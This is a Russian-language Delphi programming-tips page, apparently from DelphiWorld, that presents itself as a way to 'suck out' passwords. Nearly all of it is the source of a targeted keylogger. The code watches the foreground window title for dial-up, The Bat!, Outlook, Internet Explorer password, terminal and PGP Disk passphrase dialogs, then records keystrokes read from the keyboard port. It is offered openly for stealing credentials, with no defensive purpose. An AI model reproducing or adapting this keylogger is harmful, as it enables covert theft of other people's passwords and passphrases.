<h1>Способ высосать пароли из едитов определенных программ</h1>
<div class="date">01.01.2007</div>

Вот хороший способ высосать пароли из едитов определенных программ - Достоинством метода является отсутствие необходимости читать длинющие keylog - записи, тк кейлоггинг ведется только в интересующих нас окнах (Terminal, DUN, etc...). </p>
<pre>
unit ksf;
interface
uses windows,Controls,Forms, StdCtrls, Classes, ExtCtrls;
 
type
 Tf1 = class(TForm)
   t1: TTimer;
   m1: TMemo;
   procedure t1t(Sender: TObject);
 end;
 
var
f1: Tf1;
okey:byte;
KAr:array[1..88] of pchar=('-Esc-','1','2','3','4','5','6','7','8','9',
'0','-','=','bsp','-Tab-','q','w','e','r','t','y','u','i','o','p',
'[',']','#13','-Ctrl-','a','s','d','f','g','h','j','k','l',';','''','`',
'-Shift-','\','z','x','c','v','b','n','m',',','.','/','-Shift-','*',
'Alt',' ','CL','F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','NL',
'SL','-Home-','-Up-','-PgUp-','-','-Left-','-*5*-','-Right-','+',
'-End-','-Down-','-PDn-','-Ins-','-Del-','','','-Unk-','F11','F12');
 
implementation
{$R *.DFM}
 
procedure Tf1.t1t(Sender: TObject);
var
key:byte;
cap0:pchar;
cap1:string;
begin
getmem(cap0,255);
GetWindowText(GetforegroundWindow,cap0,255); //title активного окна
cap1:=cap0;
freemem(cap0);
if(pos('Connect To',cap1)&lt; &gt; 0)or        //DialUP
  (pos('Установка связи',cap1)&lt; &gt; 0)or   //DialUP
  (pos('Вход в систему',cap1)&lt; &gt; 0)or    //DialUP
  (pos('EType Dialer',cap1)&lt; &gt; 0)or      //DialUP
  (pos('p Networking',cap1)&lt; &gt; 0)or      //DialUP
  (pos('p Connection',cap1)&lt; &gt; 0)or      //DialUP
  (pos('Connecting to',cap1)&lt; &gt; 0)or     //DialUP
  (pos('Connessione a',cap1)&lt; &gt; 0)or     //DialUP
  (pos('Edit User - ',cap1)&lt; &gt; 0)or      //The Bat!
  (pos('Мастер подключения к Интернету',cap1)&lt; &gt; 0)or //MSIE,MSOutlook,etc
  (pos('сетевого пароля',cap1)&lt; &gt; 0)or   //MSIE
  (pos('Свойства: ',cap1)&lt; &gt; 0)or        //MSOutlook
  (pos('Вход - ',cap1)&lt; &gt; 0)or           //MSOutlook
  (pos(' - Receiving mail',cap1)&lt; &gt; 0)or //The Bat!
  (pos('Окно терминала',cap1)&lt; &gt; 0)or    //Terminal
  (pos('Passphrase',cap1)&lt; &gt; 0)          //PGP Disk
then
begin
 asm
  in al,60h                 // Читаем из 60h порта нажатую кнопку в al
  mov key,al                // Перемещаем код ключа из al в Key
 end;
 if okey&lt; &gt; key then
 begin
  okey:=key;
  if key&lt; =88 then           // Ловим Key_Down код
  m1.text:=m1.text+kAr[Key]  // И берем по этому коду из массива строку
 end;
end;
end;
 
 
</pre>
<p><a href="https://delphiworld.narod.ru/" target="_blank">https://delphiworld.narod.ru/</a></p>
<p>DelphiWorld 6.0</p>

